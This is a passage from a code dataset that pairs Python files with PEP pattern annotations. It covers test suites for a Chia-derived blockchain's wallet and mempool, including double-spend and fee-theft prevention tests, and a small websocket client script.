wallet.get_confirmed_balance, new_funds - tx_amount - tx_fee)\n        await time_out_assert(5, wallet.get_unconfirmed_balance, new_funds - tx_amount - tx_fee)\n    @pytest.mark.asyncio\n    async def test_wallet_create_hit_max_send_amount(self, two_wallet_nodes):\n        num_blocks = 5\n        full_nodes, wallets = two_wallet_nodes\n        full_node_1 = full_nodes[0]\n        wallet_node, server_2 = wallets[0]\n        wallet_node_2, server_3 = wallets[1]\n        wallet = wallet_node.wallet_state_manager.main_wallet\n        ph = await wallet.get_new_puzzlehash()\n        await server_2.start_client(PeerInfo(self_hostname, uint16(full_node_1.full_node.server._port)), None)\n        for i in range(0, num_blocks):\n            await full_node_1.farm_new_transaction_block(FarmNewBlockProtocol(ph))\n        funds = sum(\n            [calculate_pool_reward(uint32(i)) + calculate_base_farmer_reward(uint32(i)) for i in range(1, num_blocks)]\n        )\n        await time_out_assert(5, wallet.get_confirmed_balance, funds)\n        primaries = []\n        for i in range(0, 600):\n            primaries.append({\"puzzlehash\": ph, \"amount\": 100000000 + i})\n        tx_split_coins = await wallet.generate_signed_transaction(1, ph, 0, primaries=primaries)\n        await wallet.push_transaction(tx_split_coins)\n        await time_out_assert(\n            15, tx_in_pool, True, full_node_1.full_node.mempool_manager, tx_split_coins.spend_bundle.name()\n        )\n        for i in range(0, num_blocks):\n            await full_node_1.farm_new_transaction_block(FarmNewBlockProtocol(32 * b\"0\"))\n        funds = sum(\n            [\n                calculate_pool_reward(uint32(i)) + calculate_base_farmer_reward(uint32(i))\n                for i in range(1, num_blocks + 1)\n            ]\n        )\n        await time_out_assert(90, wallet.get_confirmed_balance, funds)\n        max_sent_amount = await wallet.get_max_send_amount()\n        under_limit_tx = None\n        try:\n            under_limit_tx = await wallet.generate_signed_transaction(\n                max_sent_amount - 1,\n                ph,\n                0,\n            )\n        except ValueError:\n            assert ValueError\n        assert under_limit_tx is not None\n        at_limit_tx = None\n        try:\n            at_limit_tx = await wallet.generate_signed_transaction(\n                max_sent_amount,\n                ph,\n                0,\n            )\n        except ValueError:\n            assert ValueError\n        assert at_limit_tx is not None\n        above_limit_tx = None\n        try:\n            above_limit_tx = await wallet.generate_signed_transaction(\n                max_sent_amount + 1,\n                ph,\n                0,\n            )\n        except ValueError:\n            pass\n        assert above_limit_tx is None\n    @pytest.mark.asyncio\n    async def test_wallet_prevent_fee_theft(self, two_wallet_nodes):\n        num_blocks = 5\n        full_nodes, wallets = two_wallet_nodes\n        full_node_1 = full_nodes[0]\n        wallet_node, server_2 = wallets[0]\n        wallet_node_2, server_3 = wallets[1]\n        wallet = wallet_node.wallet_state_manager.main_wallet\n        ph = await wallet.get_new_puzzlehash()\n        await server_2.start_client(PeerInfo(self_hostname, uint16(full_node_1.full_node.server._port)), None)\n        for i in range(0, num_blocks):\n            await full_node_1.farm_new_transaction_block(FarmNewBlockProtocol(ph))\n        funds = sum(\n            [calculate_pool_reward(uint32(i)) + calculate_base_farmer_reward(uint32(i)) for i in range(1, num_blocks)]\n        )\n        await time_out_assert(5, wallet.get_confirmed_balance, funds)\n        await time_out_assert(5, wallet.get_unconfirmed_balance, funds)\n        assert await wallet.get_confirmed_balance() == funds\n        assert await wallet.get_unconfirmed_balance() == funds\n        tx_amount = 3200000000000\n        tx_fee = 300000000000\n        tx = await wallet.generate_signed_transaction(\n            tx_amount,\n            await wallet_node_2.wallet_state_manager.main_wallet.get_new_puzzlehash(),\n            tx_fee,\n        )\n        for cs in tx.spend_bundle.coin_solutions:\n            if cs.additions() == []:\n                stolen_cs = cs\n        stolen_sb = await wallet.sign_transaction([stolen_cs])\n        now = uint64(int(time.time()))\n        add_list = list(stolen_sb.additions())\n        rem_list = list(stolen_sb.removals())\n        name = stolen_sb.name()\n        stolen_tx = TransactionRecord(\n            confirmed_at_height=uint32(0),\n            created_at_time=now,\n            to_puzzle_hash=32 * b\"0\",\n            amount=0,\n            fee_amount=stolen_cs.coin.amount,\n            confirmed=False,\n            sent=uint32(0),\n            spend_bundle=stolen_sb,\n            additions=add_list,\n            removals=rem_list,\n            wallet_id=wallet.id(),\n            sent_to=[],\n            trade_id=None,\n            type=uint32(TransactionType.OUTGOING_TX.value),\n            name=name,\n        )\n        await wallet.push_transaction(stolen_tx)\n        await time_out_assert(5, wallet.get_confirmed_balance, funds)\n        await time_out_assert(5, wallet.get_unconfirmed_balance, funds - stolen_cs.coin.amount)\n        for i in range(0, num_blocks):\n            await full_node_1.farm_new_transaction_block(FarmNewBlockProtocol(32 * b\"0\"))\n        outstanding_coinbase_rewards = 2000000000000\n        await time_out_assert(5, wallet.get_confirmed_balance, funds + outstanding_coinbase_rewards)\n        await time_out_assert(5, wallet.get_confirmed_balance, funds + outstanding_coinbase_rewards)\n    @pytest.mark.asyncio\n    async def test_wallet_tx_reorg(self, two_wallet_nodes):\n        num_blocks = 5\n        full_nodes, wallets = two_wallet_nodes\n        full_node_api = full_nodes[0]\n        fn_server = full_node_api.full_node.server\n        wallet_node, server_2 = wallets[0]\n        wallet_node: WalletNode = wallet_node\n        wallet_node_2, server_3 = wallets[1]\n        wallet = wallet_node.wallet_state_manager.main_wallet\n        wallet_2 = wallet_node_2.wallet_state_manager.main_wallet\n        ph = await wallet.get_new_puzzlehash()\n        ph2 = await wallet_2.get_new_puzzlehash()\n        await server_2.start_client(PeerInfo(self_hostname, uint16(fn_server._port)), None)\n        await server_3.start_client(PeerInfo(self_hostname, uint16(fn_server._port)), None)\n        for i in range(0, num_blocks):\n            await full_node_api.farm_new_transaction_block(FarmNewBlockProtocol(ph))\n        funds = sum(\n            [calculate_pool_reward(uint32(i)) + calculate_base_farmer_reward(uint32(i)) for i in range(1, num_blocks)]\n        )\n        all_blocks = await full_node_api.get_all_full_blocks()\n        coin = list(all_blocks[-3].get_included_reward_coins())[0]\n        await asyncio.sleep(5)\n        tx = await wallet.generate_signed_transaction(1000, ph2, coins={coin})\n        await wallet.push_transaction(tx)\n        await full_node_api.full_node.respond_transaction(tx.spend_bundle, tx.name)\n        await time_out_assert(5, wallet.get_confirmed_balance, funds)\n        for i in range(0, 2):\n            await full_node_api.farm_new_transaction_block(FarmNewBlockProtocol(32 * b\"0\"))\n        await time_out_assert(5, wallet_2.get_confirmed_balance, 1000)\n        await time_out_assert(5, wallet_node.wallet_state_manager.blockchain.get_peak_height, 7)\n        peak_height = full_node_api.full_node.blockchain.get_peak().height\n        print(peak_height)\n        await full_node_api.reorg_from_index_to_new_index(\n            ReorgProtocol(uint32(peak_height - 3), uint32(peak_height + 3), 32 * b\"0\")\n        )\n        funds = sum(\n            [\n                calculate_pool_reward(uint32(i)) + calculate_base_farmer_reward(uint32(i))\n                for i in range(1, peak_height - 2)\n            ]\n        )\n        await time_out_assert(7, full_node_api.full_node.blockchain.get_peak_height, peak_height + 3)\n        await time_out_assert(7, wallet_node.wallet_state_manager.blockchain.get_peak_height, peak_height + 3)\n        for i in range(0, num_blocks):\n            await asyncio.sleep(1)\n            await full_node_api.farm_new_transaction_block(FarmNewBlockProtocol(32 * b\"0\"))\n        print(await wallet.get_confirmed_balance())\n        await time_out_assert(15, wallet.get_confirmed_balance, funds - 1000)\n        unconfirmed = await wallet_node.wallet_state_manager.tx_store.get_unconfirmed_for_wallet(int(wallet.id()))\n        assert len(unconfirmed) == 0\n        tx_record = await wallet_node.wallet_state_manager.tx_store.get_transaction_record(tx.name)\n        removed = tx_record.removals[0]\n        added = tx_record.additions[0]\n        added_1 = tx_record.additions[1]\n        wallet_coin_record_rem = await wallet_node.wallet_state_manager.coin_store.get_coin_record(removed.name())\n        assert wallet_coin_record_rem.spent\n        coin_record_full_node = await full_node_api.full_node.coin_store.get_coin_record(removed.name())\n        assert coin_record_full_node.spent\n        add_1_coin_record_full_node = await full_node_api.full_node.coin_store.get_coin_record(added.name())\n        assert add_1_coin_record_full_node is not None\n        assert add_1_coin_record_full_node.confirmed_block_index > 0\n        add_2_coin_record_full_node = await full_node_api.full_node.coin_store.get_coin_record(added_1.name())\n        assert add_2_coin_record_full_node is not None\n        assert add_2_coin_record_full_node.confirmed_block_index > 0",
            "patterns": {
                "pep_526": [
                    [
                        43,
                        "server_1: TstServer = full_node_api.full_node.server"
                    ],
                    [
                        394,
                        "wallet_node: WalletNode = wallet_node"
                    ],
                    [
                        59,
                        "wsm: WalletStateManager = wallet_node.wallet_state_manager"
                    ]
                ],
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        23,
                        25,
                        "async generator",
                        "async def wallet_node(self):\n        async for _ in setup_simulators_and_wallets(1, 1, {}):\n            yield _"
                    ],
                    [
                        27,
                        29,
                        "async generator",
                        "async def two_wallet_nodes(self):\n        async for _ in setup_simulators_and_wallets(1, 2, {}):\n            yield _"
                    ],
                    [
                        31,
                        33,
                        "async generator",
                        "async def two_wallet_nodes_five_freeze(self):\n        async for _ in setup_simulators_and_wallets(1, 2, {}):\n            yield _"
                    ],
                    [
                        35,
                        37,
                        "async generator",
                        "async def three_sim_two_wallets(self):\n        async for _ in setup_simulators_and_wallets(3, 2, {}):\n            yield _"
                    ],
                    [
                        24,
                        25,
                        "async for",
                        "async for _ in setup_simulators_and_wallets(1, 1, {}):\n            yield _"
                    ],
                    [
                        28,
                        29,
                        "async for",
                        "async for _ in setup_simulators_and_wallets(1, 2, {}):\n            yield _"
                    ],
                    [
                        32,
                        33,
                        "async for",
                        "async for _ in setup_simulators_and_wallets(1, 2, {}):\n            yield _"
                    ],
                    [
                        36,
                        37,
                        "async for",
                        "async for _ in setup_simulators_and_wallets(3, 2, {}):\n            yield _"
                    ]
                ]
            }
        },
        "32": {
            "file": "import aiohttp\nimport asyncio\nasync def main():\n    session = aiohttp.ClientSession()\n    print(\"StaRTED\")\n    async with session.ws_connect('http://143.198.77.145:8000/ws') as ws:\n        print(\"Started\")\n        async for msg in ws:\n            print(ws)\n            if msg.type == aiohttp.WSMsgType.TEXT:\n                if msg.data == 'close cmd':\n                    await ws.close()\n                    break\n                else:\n                    print(msg.data)\n            elif msg.type == aiohttp.WSMsgType.ERROR:\n                break\n    print(\"End\")\nloop = asyncio.get_event_loop()\nloop.run_until_complete(main())",
            "patterns": {
                "pep_567": [
                    [
                        2,
                        2,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        8,
                        17,
                        "async for",
                        "async for msg in ws:\n            print(ws)\n            if msg.type == aiohttp.WSMsgType.TEXT:\n                if msg.data == 'close cmd':\n                    await ws.close()\n                    break\n                else:\n                    print(msg.data)\n            elif msg.type == aiohttp.WSMsgType.ERROR:\n                break"
                    ]
                ]
            }
        },
        "33": {
            "file": "import asyncio\nimport logging\nfrom typing import Dict, List, Optional, Tuple, Callable\nimport pytest\nfrom clvm import SExp\nfrom clvm.EvalError import EvalError\nimport mint.server.ws_connection as ws\nfrom mint.full_node.mempool import Mempool\nfrom mint.full_node.full_node_api import FullNodeAPI\nfrom mint.protocols import full_node_protocol\nfrom mint.simulator.simulator_protocol import FarmNewBlockProtocol\nfrom mint.types.announcement import Announcement\nfrom mint.types.blockchain_format.coin import Coin\nfrom mint.types.coin_spend import CoinSpend\nfrom mint.types.condition_opcodes import ConditionOpcode\nfrom mint.types.condition_with_args import ConditionWithArgs\nfrom mint.types.spend_bundle import SpendBundle\nfrom mint.types.mempool_item import MempoolItem\nfrom mint.util.clvm import int_to_bytes\nfrom mint.util.condition_tools import conditions_for_solution\nfrom mint.util.errors import Err, ValidationError\nfrom mint.util.ints import uint64\nfrom mint.util.hash import std_hash\nfrom mint.types.mempool_inclusion_status import MempoolInclusionStatus\nfrom mint.util.api_decorators import api_request, peer_required, bytes_required\nfrom mint.full_node.mempool_check_conditions import parse_condition_args, parse_condition, get_name_puzzle_conditions\nfrom mint.full_node.pending_tx_cache import PendingTxCache\nfrom blspy import G2Element\nfrom tests.connection_utils import connect_and_get_peer\nfrom tests.core.node_height import node_height_at_least\nfrom tests.setup_nodes import bt, setup_simulators_and_wallets\nfrom tests.time_out_assert import time_out_assert\nfrom mint.types.blockchain_format.program import Program, INFINITE_COST\nfrom mint.consensus.condition_costs import ConditionCost\nfrom mint.consensus.cost_calculator import NPCResult\nfrom mint.types.blockchain_format.program import SerializedProgram\nfrom clvm_tools import binutils\nfrom mint.types.generator_types import BlockGenerator\nfrom clvm.casts import int_from_bytes\nBURN_PUZZLE_HASH = b\"0\" * 32\nBURN_PUZZLE_HASH_2 = b\"1\" * 32\nWALLET_A = bt.get_pool_wallet_tool()\nlog = logging.getLogger(__name__)\ndef generate_test_spend_bundle(\n    coin: Coin,\n    condition_dic: Dict[ConditionOpcode, List[ConditionWithArgs]] = None,\n    fee: uint64 = uint64(0),\n    amount: uint64 = uint64(1000),\n    new_puzzle_hash=BURN_PUZZLE_HASH,\n) -> SpendBundle:\n    if condition_dic is None:\n        condition_dic = {}\n    transaction = WALLET_A.generate_signed_transaction(amount, new_puzzle_hash, coin, condition_dic, fee)\n    assert transaction is not None\n    return transaction\n@pytest.fixture(scope=\"module\")\ndef event_loop():\n    loop = asyncio.get_event_loop()\n    yield loop\n@pytest.fixture(scope=\"module\")\nasync def two_nodes():\n    async_gen = setup_simulators_and_wallets(2, 1, {})\n    nodes, _ = await async_gen.__anext__()\n    full_node_1 = nodes[0]\n    full_node_2 = nodes[1]\n    server_1 = full_node_1.full_node.server\n    server_2 = full_node_2.full_node.server\n    yield full_node_1, full_node_2, server_1, server_2\n    async for _ in async_gen:\n        yield _\ndef make_item(idx: int, cost: uint64 = uint64(80)) -> MempoolItem:\n    spend_bundle_name = bytes([idx] * 32)\n    return MempoolItem(\n        SpendBundle([], G2Element()),\n        uint64(0),\n        NPCResult(None, [], cost),\n        cost,\n        spend_bundle_name,\n        [],\n        [],\n        SerializedProgram(),\n    )\nclass TestPendingTxCache:\n    def test_recall(self):\n        c = PendingTxCache(100)\n        item = make_item(1)\n        c.add(item)\n        tx = c.drain()\n        assert tx == {item.spend_bundle_name: item}\n    def test_fifo_limit(self):\n        c = PendingTxCache(200)\n        items = [make_item(i) for i in range(1, 4)]\n        for i in items:\n            c.add(i)\n        tx = c.drain()\n        assert tx == {items[-2].spend_bundle_name: items[-2], items[-1].spend_bundle_name: items[-1]}\n    def test_drain(self):\n        c = PendingTxCache(100)\n        item = make_item(1)\n        c.add(item)\n        tx = c.drain()\n        assert tx == {item.spend_bundle_name: item}\n        tx = c.drain()\n        assert tx == {}\n    def test_cost(self):\n        c = PendingTxCache(200)\n        assert c.cost() == 0\n        item1 = make_item(1)\n        c.add(item1)\n        assert c.cost() == 80\n        item2 = make_item(2)\n        c.add(item2)\n        assert c.cost() == 160\n        item3 = make_item(3)\n        c.add(item3)\n        assert c.cost() == 160\n        tx = c.drain()\n        assert tx == {item2.spend_bundle_name: item2, item3.spend_bundle_name: item3}\n        assert c.cost() == 0\n        item4 = make_item(4)\n        c.add(item4)\n        assert c.cost() == 80\n        tx = c.drain()\n        assert tx == {item4.spend_bundle_name: item4}\nclass TestMempool:\n    @pytest.mark.asyncio\n    async def test_basic_mempool(self, two_nodes):\n        reward_ph = WALLET_A.get_new_puzzlehash()\n        blocks = bt.get_consecutive_blocks(\n            3,\n            guarantee_transaction_block=True,\n            farmer_reward_puzzle_hash=reward_ph,\n            pool_reward_puzzle_hash=reward_ph,\n        )\n        full_node_1, _, server_1, _ = two_nodes\n        for block in blocks:\n            await full_node_1.full_node.respond_block(full_node_protocol.RespondBlock(block))\n        await time_out_assert(60, node_height_at_least, True, full_node_1, blocks[-1].height)\n        max_mempool_cost = 40000000 * 5\n        mempool = Mempool(max_mempool_cost)\n        assert mempool.get_min_fee_rate(104000) == 0\n        with pytest.raises(ValueError):\n            mempool.get_min_fee_rate(max_mempool_cost + 1)\n        spend_bundle = generate_test_spend_bundle(list(blocks[-1].get_included_reward_coins())[0])\n        assert spend_bundle is not None\n@peer_required\n@api_request\n@bytes_required\nasync def respond_transaction(\n    node: FullNodeAPI,\n    tx: full_node_protocol.RespondTransaction,\n    peer: ws.WSMintConnection,\n    tx_bytes: bytes = b\"\",\n    test: bool = False,\n) -> Tuple[MempoolInclusionStatus, Optional[Err]]:\n    assert tx_bytes != b\"\"\n    spend_name = std_hash(tx_bytes)\n    if spend_name in node.full_node.full_node_store.pending_tx_request:\n        node.full_node.full_node_store.pending_tx_request.pop(spend_name)\n    if spend_name in node.full_node.full_node_store.peers_with_tx:\n        node.full_node.full_node_store.peers_with_tx.pop(spend_name)\n    return await node.full_node.respond_transaction(tx.transaction, spend_name, peer, test)\nclass TestMempoolManager:\n    @pytest.mark.asyncio\n    async def test_basic_mempool_manager(self, two_nodes):\n        reward_ph = WALLET_A.get_new_puzzlehash()\n        blocks = bt.get_consecutive_blocks(\n            5,\n            guarantee_transaction_block=True,\n            farmer_reward_puzzle_hash=reward_ph,\n            pool_reward_puzzle_hash=reward_ph,\n        )\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        peer = await connect_and_get_peer(server_1, server_2)\n        for block in blocks:\n            await full_node_1.full_node.respond_block(full_node_protocol.RespondBlock(block))\n        await time_out_assert(60, node_height_at_least, True, full_node_2, blocks[-1].height)\n        spend_bundle = generate_test_spend_bundle(list(blocks[-1].get_included_reward_coins())[0])\n        assert spend_bundle is not None\n        tx: full_node_protocol.RespondTransaction = full_node_protocol.RespondTransaction(spend_bundle)\n        res = await full_node_1.respond_transaction(tx, peer)\n        log.info(f\"Res {res}\")\n        await time_out_assert(\n            10,\n            full_node_1.full_node.mempool_manager.get_spendbundle,\n            spend_bundle,\n            spend_bundle.name(),\n        )\n    @pytest.mark.asyncio\n    async def test_coin_announcement_duplicate_consumed(self, two_nodes):\n        def test_fun(coin_1: Coin, coin_2: Coin) -> SpendBundle:\n            announce = Announcement(coin_2.name(), b\"test\")\n            cvp = ConditionWithArgs(ConditionOpcode.ASSERT_COIN_ANNOUNCEMENT, [announce.name()])\n            dic = {cvp.opcode: [cvp] * 100}\n            cvp2 = ConditionWithArgs(ConditionOpcode.CREATE_COIN_ANNOUNCEMENT, [b\"test\"])\n            dic2 = {cvp.opcode: [cvp2]}\n            spend_bundle1 = generate_test_spend_bundle(coin_1, dic)\n            spend_bundle2 = generate_test_spend_bundle(coin_2, dic2)\n            bundle = SpendBundle.aggregate([spend_bundle1, spend_bundle2])\n            return bundle\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        blocks, bundle, status, err = await self.condition_tester2(two_nodes, test_fun)\n        mempool_bundle = full_node_1.full_node.mempool_manager.get_spendbundle(bundle.name())\n        assert mempool_bundle is bundle\n        assert status == MempoolInclusionStatus.SUCCESS\n        assert err is None\n    @pytest.mark.asyncio\n    async def test_coin_duplicate_announcement_consumed(self, two_nodes):\n        def test_fun(coin_1: Coin, coin_2: Coin) -> SpendBundle:\n            announce = Announcement(coin_2.name(), b\"test\")\n            cvp = ConditionWithArgs(ConditionOpcode.ASSERT_COIN_ANNOUNCEMENT, [announce.name()])\n            dic = {cvp.opcode: [cvp]}\n            cvp2 = ConditionWithArgs(ConditionOpcode.CREATE_COIN_ANNOUNCEMENT, [b\"test\"])\n            dic2 = {cvp.opcode: [cvp2] * 100}\n            spend_bundle1 = generate_test_spend_bundle(coin_1, dic)\n            spend_bundle2 = generate_test_spend_bundle(coin_2, dic2)\n            bundle = SpendBundle.aggregate([spend_bundle1, spend_bundle2])\n            return bundle\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        blocks, bundle, status, err = await self.condition_tester2(two_nodes, test_fun)\n        mempool_bundle = full_node_1.full_node.mempool_manager.get_spendbundle(bundle.name())\n        assert mempool_bundle is bundle\n        assert status == MempoolInclusionStatus.SUCCESS\n        assert err is None\n    @pytest.mark.asyncio\n    async def test_double_spend(self, two_nodes):\n        reward_ph = WALLET_A.get_new_puzzlehash()\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        blocks = await full_node_1.get_all_full_blocks()\n        start_height = blocks[-1].height\n        blocks = bt.get_consecutive_blocks(\n            3,\n            block_list_input=blocks,\n            guarantee_transaction_block=True,\n            farmer_reward_puzzle_hash=reward_ph,\n            pool_reward_puzzle_hash=reward_ph,\n        )\n        peer = await connect_and_get_peer(server_1, server_2)\n        for block in blocks:\n            await full_node_1.full_node.respond_block(full_node_protocol.RespondBlock(block))\n        await time_out_assert(60, node_height_at_least, True, full_node_1, start_height + 3)\n        spend_bundle1 = generate_test_spend_bundle(list(blocks[-1].get_included_reward_coins())[0])\n        assert spend_bundle1 is not None\n        tx1: full_node_protocol.RespondTransaction = full_node_protocol.RespondTransaction(spend_bundle1)\n        status, err = await respond_transaction(full_node_1, tx1, peer)\n        assert status == MempoolInclusionStatus.SUCCESS\n        assert err is None\n        spend_bundle2 = generate_test_spend_bundle(\n            list(blocks[-1].get_included_reward_coins())[0],\n            new_puzzle_hash=BURN_PUZZLE_HASH_2,\n        )\n        assert spend_bundle2 is not None\n        tx2: full_node_protocol.RespondTransaction = full_node_protocol.RespondTransaction(spend_bundle2)\n        status, err = await respond_transaction(full_node_1, tx2, peer)\n        sb1 = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name())\n        sb2 = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle2.name())\n        assert sb1 == spend_bundle1\n        assert sb2 is None\n        assert status == MempoolInclusionStatus.PENDING\n        assert err == Err.MEMPOOL_CONFLICT\n    async def send_sb(self, node, peer, sb):\n        tx = full_node_protocol.RespondTransaction(sb)\n        await node.respond_transaction(tx, peer)\n    async def gen_and_send_sb(self, node, peer, *args, **kwargs):\n        sb = generate_test_spend_bundle(*args, **kwargs)\n        assert sb is not None\n        await self.send_sb(node, peer, sb)\n        return sb\n    def assert_sb_in_pool(self, node, sb):\n        assert sb == node.full_node.mempool_manager.get_spendbundle(sb.name())\n    def assert_sb_not_in_pool(self, node, sb):\n        assert node.full_node.mempool_manager.get_spendbundle(sb.name()) is None\n    @pytest.mark.asyncio\n    async def test_double_spend_with_higher_fee(self, two_nodes):\n        reward_ph = WALLET_A.get_new_puzzlehash()\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        blocks = await full_node_1.get_all_full_blocks()\n        start_height = blocks[-1].height\n        blocks = bt.get_consecutive_blocks(\n            3,\n            block_list_input=blocks,\n            guarantee_transaction_block=True,\n            farmer_reward_puzzle_hash=reward_ph,\n            pool_reward_puzzle_hash=reward_ph,\n        )\n        peer = await connect_and_get_peer(server_1, server_2)\n        for block in blocks:\n            await full_node_1.full_node.respond_block(full_node_protocol.RespondBlock(block))\n        await time_out_assert(60, node_height_at_least, True, full_node_1, start_height + 3)\n        coins = iter(blocks[-1].get_included_reward_coins())\n        coin1, coin2 = next(coins), next(coins)\n        coins = iter(blocks[-2].get_included_reward_coins())\n        coin3, coin4 = next(coins), next(coins)\n        sb1_1 = await self.gen_and_send_sb(full_node_1, peer, coin1)\n        sb1_2 = await self.gen_and_send_sb(full_node_1, peer, coin1, fee=uint64(1))\n        self.assert_sb_in_pool(full_node_1, sb1_1)\n        self.assert_sb_not_in_pool(full_node_1, sb1_2)\n        min_fee_increase = full_node_1.full_node.mempool_manager.get_min_fee_increase()\n        sb1_3 = await self.gen_and_send_sb(full_node_1, peer, coin1, fee=uint64(min_fee_increase))\n        self.assert_sb_not_in_pool(full_node_1, sb1_1)\n        self.assert_sb_in_pool(full_node_1, sb1_3)\n        sb2 = generate_test_spend_bundle(coin2, fee=uint64(min_fee_increase))\n        sb12 = SpendBundle.aggregate((sb2, sb1_3))\n        await self.send_sb(full_node_1, peer, sb12)\n        self.assert_sb_in_pool(full_node_1, sb12)\n        self.assert_sb_not_in_pool(full_node_1, sb1_3)\n        sb3 = generate_test_spend_bundle(coin3, fee=uint64(min_fee_increase * 2))\n        sb23 = SpendBundle.aggregate((sb2, sb3))\n        await self.send_sb(full_node_1, peer, sb23)\n        self.assert_sb_in_pool(full_node_1, sb12)\n        self.assert_sb_not_in_pool(full_node_1, sb23)\n        await self.send_sb(full_node_1, peer, sb3)\n        self.assert_sb_in_pool(full_node_1, sb3)\n        sb4_1 = generate_test_spend_bundle(coin4, fee=uint64(min_fee_increase))\n        sb1234_1 = SpendBundle.aggregate((sb12, sb3, sb4_1))\n        await self.send_sb(full_node_1, peer, sb1234_1)\n        self.assert_sb_not_in_pool(full_node_1, sb1234_1)\n        sb4_2 = generate_test_spend_bundle(coin4, fee=uint64(min_fee_increase * 2))\n        sb1234_2 = SpendBundle.aggregate((sb12, sb3, sb4_2))\n        await self.send_sb(full_node_1, peer, sb1234_2)\n        self.assert_sb_in_pool(full_node_1, sb1234_2)\n        self.assert_sb_not_in_pool(full_node_1, sb12)\n        self.assert_sb_not_in_pool(full_node_1, sb3)\n    async def condition_tester(\n        self,\n        two_nodes,\n        dic: Dict[ConditionOpcode, List[ConditionWithArgs]],\n        fee: int = 0,\n        num_blocks: int = 3,\n        coin: Optional[Coin] = None,\n    ):\n        reward_ph = WALLET_A.get_new_puzzlehash()\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        blocks = await full_node_1.get_all_full_blocks()\n        start_height = blocks[-1].height\n        blocks = bt.get_consecutive_blocks(\n            num_blocks,\n            block_list_input=blocks,\n            guarantee_transaction_block=True,\n            farmer_reward_puzzle_hash=reward_ph,\n            pool_reward_puzzle_hash=reward_ph,\n        )\n        peer = await connect_and_get_peer(server_1, server_2)\n        for block in blocks:\n            await full_node_1.full_node.respond_block(full_node_protocol.RespondBlock(block))\n        await time_out_assert(60, node_height_at_least, True, full_node_1, start_height + num_blocks)\n        spend_bundle1 = generate_test_spend_bundle(\n            coin or list(blocks[-num_blocks + 2].get_included_reward_coins())[0], dic, uint64(fee)\n        )\n        assert spend_bundle1 is not None\n        tx1: full_node_protocol.RespondTransaction = full_node_protocol.RespondTransaction(spend_bundle1)\n        status, err = await respond_transaction(full_node_1, tx1, peer)\n        return blocks, spend_bundle1, peer, status, err\n    @pytest.mark.asyncio\n    async def condition_tester2(self, two_nodes, test_fun: Callable[[Coin, Coin], SpendBundle]):\n        reward_ph = WALLET_A.get_new_puzzlehash()\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        blocks = await full_node_1.get_all_full_blocks()\n        start_height = blocks[-1].height if len(blocks) > 0 else -1\n        blocks = bt.get_consecutive_blocks(\n            3,\n            block_list_input=blocks,\n            guarantee_transaction_block=True,\n            farmer_reward_puzzle_hash=reward_ph,\n            pool_reward_puzzle_hash=reward_ph,\n        )\n        peer = await connect_and_get_peer(server_1, server_2)\n        for block in blocks:\n            await full_node_1.full_node.respond_block(full_node_protocol.RespondBlock(block))\n        await time_out_assert(60, node_height_at_least, True, full_node_1, start_height + 3)\n        coin_1 = list(blocks[-2].get_included_reward_coins())[0]\n        coin_2 = list(blocks[-1].get_included_reward_coins())[0]\n        bundle = test_fun(coin_1, coin_2)\n        tx1: full_node_protocol.RespondTransaction = full_node_protocol.RespondTransaction(bundle)\n        status, err = await respond_transaction(full_node_1, tx1, peer)\n        return blocks, bundle, status, err\n    @pytest.mark.asyncio\n    async def test_invalid_block_index(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        blocks = await full_node_1.get_all_full_blocks()\n        start_height = blocks[-1].height\n        cvp = ConditionWithArgs(\n            ConditionOpcode.ASSERT_HEIGHT_ABSOLUTE,\n            [int_to_bytes(start_height + 5)],\n        )\n        dic = {ConditionOpcode.ASSERT_HEIGHT_ABSOLUTE: [cvp]}\n        blocks, spend_bundle1, peer, status, err = await self.condition_tester(two_nodes, dic)\n        sb1 = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name())\n        assert sb1 is None\n        assert status == MempoolInclusionStatus.PENDING\n        assert err == Err.ASSERT_HEIGHT_ABSOLUTE_FAILED\n    @pytest.mark.asyncio\n    async def test_block_index_missing_arg(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        blocks = await full_node_1.get_all_full_blocks()\n        cvp = ConditionWithArgs(ConditionOpcode.ASSERT_HEIGHT_ABSOLUTE, [])\n        dic = {ConditionOpcode.ASSERT_HEIGHT_ABSOLUTE: [cvp]}\n        blocks, spend_bundle1, peer, status, err = await self.condition_tester(two_nodes, dic)\n        sb1 = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name())\n        assert sb1 is None\n        assert status == MempoolInclusionStatus.FAILED\n        assert err == Err.INVALID_CONDITION\n    @pytest.mark.asyncio\n    async def test_correct_block_index(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        cvp = ConditionWithArgs(ConditionOpcode.ASSERT_HEIGHT_ABSOLUTE, [int_to_bytes(1)])\n        dic = {ConditionOpcode.ASSERT_HEIGHT_ABSOLUTE: [cvp]}\n        blocks, spend_bundle1, peer, status, err = await self.condition_tester(two_nodes, dic)\n        sb1 = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name())\n        assert sb1 is spend_bundle1\n        assert status == MempoolInclusionStatus.SUCCESS\n        assert err is None\n    @pytest.mark.asyncio\n    async def test_block_index_garbage(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        cvp = ConditionWithArgs(ConditionOpcode.ASSERT_HEIGHT_ABSOLUTE, [int_to_bytes(1), b\"garbage\"])\n        dic = {ConditionOpcode.ASSERT_HEIGHT_ABSOLUTE: [cvp]}\n        blocks, spend_bundle1, peer, status, err = await self.condition_tester(two_nodes, dic)\n        sb1 = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name())\n        assert sb1 is spend_bundle1\n        assert status == MempoolInclusionStatus.SUCCESS\n        assert err is None\n    @pytest.mark.asyncio\n    async def test_negative_block_index(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        cvp 